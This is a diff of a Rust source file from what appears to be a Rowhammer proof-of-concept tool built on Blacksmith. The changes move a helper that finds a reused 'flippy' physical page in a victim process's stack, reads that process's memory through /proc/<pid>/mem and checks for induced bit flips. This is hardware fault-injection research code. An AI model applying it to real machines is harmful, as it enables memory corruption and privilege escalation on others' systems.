@@ -1,24 +1,21 @@
-use std::{
-    fs::OpenOptions,
-    io::{Read, Seek, SeekFrom},
-    ptr::null_mut,
-};
+use std::ptr::null_mut;
 
 use anyhow::bail;
 use bs_poc::{
     allocator::{util::mmap, ConsecAllocator, Pfn, Spoiler},
     hammerer::blacksmith::blacksmith_config::BlacksmithConfig,
     memory::{
-        mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, MemBlock, PageMapInfo,
-        PfnResolver,
+        mem_configuration::MemConfiguration, BytePointer, ConsecBlocks, MemBlock, PfnResolver,
     },
-    util::{find_pattern, KB, MB, PAGE_SIZE},
-    victim::{stack_process::InjectionConfig, HammerVictim, HammerVictimError, StackProcess},
+    util::{KB, MB},
+    victim::{
+        stack_process::{find_flippy_page, InjectionConfig},
+        HammerVictim, HammerVictimError, StackProcess,
+    },
 };
 use clap::{arg, Parser};
 use indicatif::MultiProgress;
 use log::{debug, info, warn};
-use pagemap::MapsEntry;
 
 /// CLI arguments for the `hammer` binary.
 ///
@@ -115,23 +112,22 @@ fn main() -> anyhow::Result<()> {
                         continue;
                     }
                 };
-                let pid = victim.pid();
                 victim.init();
-                let flippy_region = find_flippy_page(target_pfn, pid)?;
-                if let Some(flippy_region) = &flippy_region {
-                    info!("Flippy page reused in region {:?}", flippy_region);
-                } else {
-                    warn!("Flippy page not reused");
-                }
-                println!("{:?}", flippy_region);
                 let output = match victim.check() {
                     Ok(output) => output,
                     Err(HammerVictimError::NoFlips) => "No flips".to_string(),
                     Err(HammerVictimError::IoError(e)) => e.to_string(),
                 };
-                if output.contains(&format!("{:x}", target_pfn)) {
-                    bail!("YES MAN: {},{}", bait_before, bait_after);
+                //if output.contains(&format!("{:x}", target_pfn)) {
+                //    bail!("YES MAN: {},{}", bait_before, bait_after);
+                //}
+                let flippy_page = find_flippy_page(target_pfn, victim.pid())?;
+                if let Some(flippy_region) = &flippy_page {
+                    info!("Flippy page reused in region {:?}", flippy_region);
+                } else {
+                    warn!("Flippy page not reused");
                 }
+                println!("{:?}", flippy_page);
                 info!("Child output:\n{}", output);
                 victim.stop();
                 x.dealloc();
@@ -139,88 +135,4 @@ fn main() -> anyhow::Result<()> {
         }
     }
     Ok(())
-}
-
-fn read_memory_from_proc(pid: u32, va: u64, size: u64) -> std::io::Result<Vec<u8>> {
-    // Construct the path to the process's memory file
-    let path = format!("/proc/{}/mem", pid);
-    let mut file = OpenOptions::new().read(true).open(path)?;
-
-    // Seek to the virtual memory address
-    file.seek(SeekFrom::Start(va))?;
-
-    // Read the specified number of bytes into a buffer
-    let mut buffer = vec![0; size as usize];
-    file.read_exact(&mut buffer)?;
-
-    Ok(buffer)
-}
-
-#[derive(Debug)]
-struct FlippyPage {
-    #[allow(dead_code)]
-    maps_entry: MapsEntry,
-    #[allow(dead_code)]
-    region_offset: usize, // page offset in the region
-}
-
-fn find_flippy_page(target_page: u64, pid: u32) -> anyhow::Result<Option<FlippyPage>> {
-    let pmap = PageMapInfo::load(pid as u64)?.0;
-    let mut flippy_region = None;
-    for (map, pagemap) in pmap {
-        for (idx, (va, pmap)) in pagemap.iter().enumerate() {
-            let pfn = pmap.pfn();
-            match pfn {
-                Ok(pfn) => {
-                    if target_page == pfn {
-                        flippy_region = Some(FlippyPage {
-                            maps_entry: map.0.clone(),
-                            region_offset: idx,
-                        });
-                        info!("Region: {:?}", map.0);
-                        debug!("Region size: {}", map.0.memory_region().size());
-                        info!("[{}]  {:#x}    {:#x} [REUSED TARGET PAGE]", idx, va, pfn);
-                        if let Some("[stack]") = map.0.path() {
-                            let mut stack_contents = String::new();
-                            let contents = read_memory_from_proc(pid, *va, PAGE_SIZE as u64);
-                            match contents {
-                                Ok(contents) => {
-                                    match find_pattern(&contents, 0b10101010, PAGE_SIZE) {
-                                        Some(offset) => {
-                                            info!("Found pattern at offset {}", offset);
-                                        }
-                                        None => {
-                                            info!("Pattern not found");
-                                        }
-                                    }
-                                    for (i, byte) in contents.iter().enumerate() {
-                                        stack_contents += &format!("{:02x}", byte);
-                                        if i % 8 == 7 {
-                                            stack_contents += " ";
-                                        }
-                                        if i % 64 == 63 {
-                                            stack_contents += "\n";
-                                        }
-                                    }
-                                    info!("Content:\n{}", stack_contents);
-                                }
-                                Err(e) => {
-                                    info!("Failed to read stack contents: {}", e);
-                                }
-                            }
-                        }
-                    } else {
-                        //info!("[{}]  {:#x}    {:#x}", idx, va, pfn);
-                    }
-                }
-                Err(e) => match e {
-                    pagemap::PageMapError::PageNotPresent => {
-                        //info!("[{}]  {:#x}    ???", idx, va);
-                    }
-                    _ => bail!(e),
-                },
-            }
-        }
-    }
-    Ok(flippy_region)
 }
